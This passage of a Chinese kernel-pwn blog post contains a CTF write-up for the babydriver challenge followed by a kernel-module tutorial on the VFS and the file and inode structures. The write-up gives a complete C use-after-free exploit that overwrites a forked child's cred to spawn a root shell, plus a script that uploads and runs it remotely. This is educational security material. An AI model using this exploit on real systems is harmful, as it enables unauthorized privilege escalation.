<p><code>babyrelease()</code>函数在<code>close(fd)</code>关闭设备节点时会被调用到，这里释放了<code>babydev_struct.device_buf</code>指向的堆块，但是并没有置空，存在一个<code>UAF</code>漏洞，<code>babydev_struct</code>是全局变量，如果我们<code>open</code>设备两次，那么第二次<code>open</code>的时候就会覆盖第一次<code>open</code>的<code>babydev_struct</code>，此时<code>free</code>掉第一个，第二个指向的就是<code>free</code>后的，因此这里存在一个<code>UAF</code>。利用<code>UAF</code>去修改新进程的<code>CRED</code>结构，从而达成权限提升的效果。</p>
<h4 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h4><p><code>cred</code>结构体大小为 <code>0xa8</code>，那么利用思路就很明确了： 1. 首先打开 <code>babydev</code> 两次，此时第二次申请的内存会覆盖第一次申请的内存地址； 2. 通过 <code>ioctl</code> 修改内存大小为 <code>0xa8</code>，也就是 <code>cred</code> 的大小； 3. 关闭第一个句柄，此时会执行 <code>babyrelease</code> 函数，全局变量中的结构体指向的 <code>0xa8</code> 大小的内存会被释放，而第二个文件句柄依然存在，因此我们获得了一个悬垂指针（指向被释放的内存）； 4. 这时<code>fork</code> 一个子进程，子进程的 <code>cred</code> 正好申请在我们释放的位置（子进程会申请额外创建<code>PCB</code>空间）； 5. 通过悬垂指针我们可以 <code>write</code> 新进程 <code>cred</code> 中的内容，从而实现新进程的权限提升。</p>
<blockquote>
<p><strong>Tips</strong></p>
<p><strong>fork() 执行流程</strong></p>
<ol>
<li>申请 <code>PID</code></li>
<li>申请 <code>PCB</code> 结构</li>
<li>复制父进程的 <code>PCB</code></li>
<li>将子进程的运行状态设置为不可执行的</li>
<li>将子进程中的某些属性清零，某些保留，某些修改</li>
<li>复制父进程的页（用到了写时拷贝技术）</li>
<li>子进程从fork()从下一行代码开始执行</li>
</ol>
<p><strong>写时拷贝技术：</strong> 父子进程在初始阶段共享所有的数据（全局、 栈区、 堆区、 代码）， 内核会将所有的区域设置为只读。 当父子进程中任意一个进程试图修改其中的数据时， 内核才会将要修改的数据所在的区域（页） 拷贝一份。</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">* 高版本 glibc 已经移除了这个库，可以用下面三个库替代</span></span><br><span class="line"><span class="comment">* #include &lt;stropts.h&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ioctls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/termbits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 打开两次设备</span></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放 fd1</span></span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 子进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="comment">// 子进程从这里开始执行</span></span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fork error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 子进程没有子进程所以子进程的 pid == 0</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 通过更改 fd2，修改子进程的 cred 的 uid，gid 等值为0</span></span><br><span class="line">        <span class="type">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] root now.&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 父进程 pid == 子进程 pid，父进程调用 wait(NULL) 等待子进程，以免程序提前结束</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因为运行环境中没有一些依赖库，所以我们采取静态编译。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -static -masm=intel -pthread exp.c -o exp</span><br></pre></td></tr></table></figure></div>

<p>有些时候系统的库可能与内核交互不匹配，导致exp正确也无法完成交互，这时候可以尝试使用 <code>musl-gcc</code>，或者使用docker进行编译。头文件里面的内容需要与目标匹配才能交互，如果 <code>gcc</code> 编译的 <code>exp</code> 过大可以考虑使用 <code>musl-gcc</code> 进行编译，不过例如 <code>userfault_fd</code> 的相关功能 <code>musl</code> 没有，并不能完全替代 gcc ，所以可以尝试使用 docker。</p>
<p><strong>打包文件系统</strong></p>
<p>我们本地调试一般采取打包的方式来方便调试。</p>
<p><em>pack.sh</em></p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">cp -r rootfs rootfs_tmp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果 gcc 编译的 exp 过大可以考虑使用 musl-gcc 进行编译，</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不过例如 userfault_fd 的相关功能 musl 没有，并不能完全替代 gcc</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">musl-gcc -static -masm=intel -pthread exp.c -o exp</span> </span><br><span class="line">gcc -static -masm=intel -pthread exp.c -o exp</span><br><span class="line">cp exp rootfs_tmp/</span><br><span class="line"></span><br><span class="line">cd rootfs_tmp || exit</span><br><span class="line">find . | cpio -o -H newc &gt;../rootfs.cpio</span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">sudo rm -rf rootfs_tmp</span><br></pre></td></tr></table></figure></div>

<p><strong>远程文件传输</strong></p>
<p>一般采取 <code>base64</code> 编码进行传输。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read())</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	sl()</span><br><span class="line">	rl()</span><br><span class="line">	count = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), <span class="number">0x200</span>):</span><br><span class="line">		sla(<span class="string">b&quot;/ $ &quot;</span>, <span class="string">b&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="number">0x200</span>] + <span class="string">b&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)</span><br><span class="line">		count += <span class="number">1</span></span><br><span class="line">		info(<span class="string">&quot;count: &quot;</span> + <span class="built_in">str</span>(count))</span><br><span class="line"></span><br><span class="line">	sla(<span class="string">b&quot;/ $ &quot;</span>, <span class="string">b&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)</span><br><span class="line">	sla(<span class="string">b&quot;/ $ &quot;</span>, <span class="string">b&quot;chmod +x /tmp/exploit&quot;</span>)</span><br><span class="line">	sla(<span class="string">b&quot;/ $ &quot;</span>, <span class="string">b&quot;/tmp/exploit &quot;</span>)</span><br><span class="line">	<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div>

<h4 id="获取-vmlinux"><a href="#获取-vmlinux" class="headerlink" title="获取 vmlinux"></a>获取 vmlinux</h4><p>由于<code>bzImage</code>是压缩过的内核镜像，因此需要获取未经压缩的 <code>vmlinux</code> 镜像用于提供调试符号，以及查找 <code>gadget</code> 和关键结构偏移。我们可以通过编译内核来获取 <code>vmlinux</code>，但即使题目提供了 <code>config</code> 文件，编译出的 <code>vmlinux</code> 中各结构的偏移也不一定与题目提供的 <code>bzImage</code>  相同。编译出的 <code>vmlinux</code> 只是在计算结构体中成员偏移起参考作用，<code>gadget</code> 等涉及在内核中偏移的还是在 <code>vmlinux-to-elf</code>  解压的 <code>vmlinux</code> 中找。</p>
<p><strong><a class="link"   target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf" >vmlinux-to-elf<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-pip liblzo2-dev</span><br><span class="line">sudo pip3 install --upgrade lz4 zstandard git+https://github.com/clubby789/python-lzo@b4e39df</span><br><span class="line">sudo pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure></div>

<p><strong>使用方法</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt;</span><br></pre></td></tr></table></figure></div>

<h4 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h4><p>首先需要对 <code>boot.sh</code> 做如下修改：</p>
<ul>
<li>添加 <code>nokaslr</code> 关闭地址随机化。</li>
<li>添加 <code>-s</code>，因为  <code>qemu</code> 其实提供了调试内核的接口，我们可以在启动参数中添加 <code>-gdb dev</code> 来启动调试服务。最常见的操作为在一个端口监听一个 <code>tcp</code> 连接。 <code>QEMU</code> 同时提供了一个简写的方式<code> -s</code>，表示 <code>-gdb tcp::1234</code>，即在 <code>1234</code> 端口开启一个 <code>gdbserver</code>。</li>
</ul>
<p><em>start.sh</em></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -initrd rootfs.cpio \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 nokaslr&#x27;</span> \</span><br><span class="line">  -enable-kvm \</span><br><span class="line">  -monitor /dev/null -m 64M \</span><br><span class="line">  --nographic \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  -cpu kvm64,+smep \</span><br><span class="line">  -s</span><br></pre></td></tr></table></figure></div>

<p>为了加载 <code>babydriver.ko</code> 的符号信息，需要获取其代码段的地址，需要修改 <code>init</code> 内容获取 <code>root</code> 权限。</p>
<p><em>.&#x2F;rootfs&#x2F;init</em></p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 0 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure></div>

<p>重新打包并启动系统，查询代码段地址。</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第一种方法</span></span><br><span class="line">-------------------------------------------------</span><br><span class="line">/ # lsmod</span><br><span class="line">babydriver 16384 0 - Live 0xffffffffc0000000 (OE)</span><br><span class="line">-------------------------------------------------</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第二种方法</span></span><br><span class="line">/ # find /sys/ | grep babydrive</span><br><span class="line">/sys/module/babydriver</span><br><span class="line">/sys/module/babydriver/srcversion</span><br><span class="line">/sys/module/babydriver/notes</span><br><span class="line">/sys/module/babydriver/notes/.note.gnu.build-id</span><br><span class="line">/sys/module/babydriver/taint</span><br><span class="line">/sys/module/babydriver/initstate</span><br><span class="line">/sys/module/babydriver/coresize</span><br><span class="line">/sys/module/babydriver/sections</span><br><span class="line">/sys/module/babydriver/sections/.bss</span><br><span class="line">/sys/module/babydriver/sections/.init.text</span><br><span class="line">/sys/module/babydriver/sections/.data</span><br><span class="line">/sys/module/babydriver/sections/.text</span><br><span class="line">/sys/module/babydriver/sections/__mcount_loc</span><br><span class="line">/sys/module/babydriver/sections/.strtab</span><br><span class="line">/sys/module/babydriver/sections/.symtab</span><br><span class="line">/sys/module/babydriver/sections/.gnu.linkonce.this_module</span><br><span class="line">/sys/module/babydriver/sections/.rodata.str1.1</span><br><span class="line">/sys/module/babydriver/sections/.note.gnu.build-id</span><br><span class="line">/sys/module/babydriver/sections/.exit.text</span><br><span class="line">/sys/module/babydriver/refcnt</span><br><span class="line">/sys/module/babydriver/uevent</span><br><span class="line">/sys/module/babydriver/holders</span><br><span class="line">/sys/module/babydriver/initsize</span><br><span class="line">/ # cat /sys/module/babydriver/sections/.text</span><br><span class="line">0xffffffffc0000000</span><br></pre></td></tr></table></figure></div>

<p><em>gdb.sh</em></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">gdb -q \</span><br><span class="line">  -ex <span class="string">&quot;file <span class="subst">$(find . -name vmlinux)</span>&quot;</span> \</span><br><span class="line">  -ex <span class="string">&quot;add-symbol-file <span class="subst">$(find . -name babydriver.ko)</span> 0xffffffffc0000000&quot;</span> \</span><br><span class="line">  -ex <span class="string">&quot;target remote localhost:1234&quot;</span> \</span><br><span class="line">  -ex <span class="string">&quot;b *0xffffffffc0000030&quot;</span> \</span><br><span class="line">  -ex <span class="string">&quot;c&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>运行 <code>exp</code> 后成功到断点。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20231207102120309.png"
                      alt="image-20231207102120309"
                ></p>
<h2 id="内核模块开发"><a href="#内核模块开发" class="headerlink" title="内核模块开发"></a>内核模块开发</h2><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>后面打算做一个文件系统的专题（其实打算把Linux kernel的五大模块都写一遍），略微详细些讲解可以先看一下我blog的另一篇文章<a href="https://jelasin.github.io/2024/01/22/%E6%B5%85%E6%9E%90Linux%E5%86%85%E6%A0%B8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8EIO/">浅析Linux内核之文件与IO</a></p>
<p>在Linux系统的视角下，无论是文件、设备、管道、还是目录，进程，甚至是磁盘，套接字等等，一切都可以被抽象成文件，一切都可以使用访问文件的方式进行操作。图中所示为Linux中虚拟文件系统（VFS）、磁盘&#x2F;Flash文件系统及一般的设备文件与设备驱动程序之间的关系。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/filesys.png"
                      alt="filesys"
                ></p>
<p>应用程序和 <code>VFS</code> 之间的接口是系统调用，而 <code>VFS</code> 与文件系统以及设备文件之间的接口是 <code>file_operations</code> 结构体成员函数，这个结构体包含对文件进行打开、关闭、读写、控制的一系列成员函数。</p>
<h4 id="file结构体"><a href="#file结构体" class="headerlink" title="file结构体"></a>file结构体</h4><p><code>file</code> 结构体代表一个打开的文件，系统中每个打开的文件在内核空间都有一个关联的 <code>struct file</code> 。它由内核在打开文件时创建，并传递给在文件上进行操作的任何函数。在文件的所有实例都关闭后，内核释放这个数据结构。在内核和驱动源代码中，<code>struct file</code> 的指针通常被命名为 <code>file</code> 或 <code>filp</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>	<span class="title">fu_llist</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> 	<span class="title">fu_rcuhead</span>;</span></span><br><span class="line">	&#125; f_u;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span>		<span class="title">f_path</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">f_inode</span>;</span>	<span class="comment">/* cached value */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>	*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Protects f_ep, f_flags.</span></span><br><span class="line"><span class="comment">	 * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">spinlock_t</span>		f_lock;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">rw_hint</span>		<span class="title">f_write_hint</span>;</span></span><br><span class="line">	<span class="type">atomic_long_t</span>		f_count;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> 		f_flags;</span><br><span class="line">	<span class="type">fmode_t</span>			f_mode;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">f_pos_lock</span>;</span></span><br><span class="line">	<span class="type">loff_t</span>			f_pos;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>	<span class="title">f_owner</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">f_cred</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>	<span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">	u64			f_version;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>			*f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="type">void</span>			*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>	*<span class="title">f_ep</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	*<span class="title">f_mapping</span>;</span></span><br><span class="line">	<span class="type">errseq_t</span>		f_wb_err;</span><br><span class="line">	<span class="type">errseq_t</span>		f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));	<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br></pre></td></tr></table></figure></div>

<h4 id="inode结构体"><a href="#inode结构体" class="headerlink" title="inode结构体"></a>inode结构体</h4><p>VFS inode包含文件访问权限、所有者、组、大小、生成时间、访问时间、最后修改时间等信息。它是Linux管理文件系统的最基本单位，也是文件系统连接任何子目录、文件的桥梁。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">    <span class="type">umode_t</span>         i_mode; <span class="comment">// inode的权限</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>      i_opflags;</span><br><span class="line">    <span class="type">kuid_t</span>          i_uid; <span class="comment">// inode所有者的id</span></span><br><span class="line">    <span class="type">kgid_t</span>          i_gid; <span class="comment">// inode所属的群组id</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        i_flags;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">dev_t</span>           i_rdev; <span class="comment">// 若是设备文件，此字段将记录设备的设备号</span></span><br><span class="line">    <span class="type">loff_t</span>          i_size; <span class="comment">// inode所代表的文件大小</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_atime</span>;</span> <span class="comment">// inode最近一次的存取时间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_mtime</span>;</span> <span class="comment">// inode最近一次的修改时间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_ctime</span>;</span> <span class="comment">// inode的产生时间</span></span><br><span class="line">    <span class="type">spinlock_t</span>      i_lock; <span class="comment">/* i_blocks, i_bytes, maybe i_size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>          i_bytes;</span><br><span class="line">    